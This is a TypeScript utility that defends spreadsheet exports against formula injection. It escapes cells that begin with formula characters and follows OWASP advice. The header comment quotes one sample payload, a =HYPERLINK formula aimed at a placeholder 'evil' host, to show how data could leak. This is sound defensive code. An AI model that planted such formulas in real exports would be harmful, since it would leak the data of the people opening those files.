/**
 * CSV/XLSX formula injection guard.
 *
 * Excel/LibreOffice/Numbers evaluate cells starting with `=`, `+`, `-`, `@`,
 * tab or CR as formulas. A malicious string like `=HYPERLINK("http://evil",...)`
 * exfiltrates data when the user opens the file. Mitigation per OWASP: prefix
 * the cell with a leading apostrophe (`'`) so the spreadsheet treats it as text.
 *
 * Apply to every user-controlled string before it reaches `XLSX.utils.aoa_to_sheet`
 * or `XLSX.utils.json_to_sheet`. Safe to apply to all strings — non-dangerous
 * cells pass through unchanged.
 */

const DANGEROUS_PREFIX = /^[=+\-@\t\r]/

export function sanitizeCell<T>(value: T): T | string {
  if (typeof value !== 'string') return value
  if (value.length === 0) return value
  return DANGEROUS_PREFIX.test(value) ? `'${value}` : value
}

export function sanitizeRow<T extends Record<string, unknown>>(row: T): T {
  const out = {} as Record<string, unknown>
  for (const k of Object.keys(row)) {
    out[k] = sanitizeCell(row[k])
  }
  return out as T
}
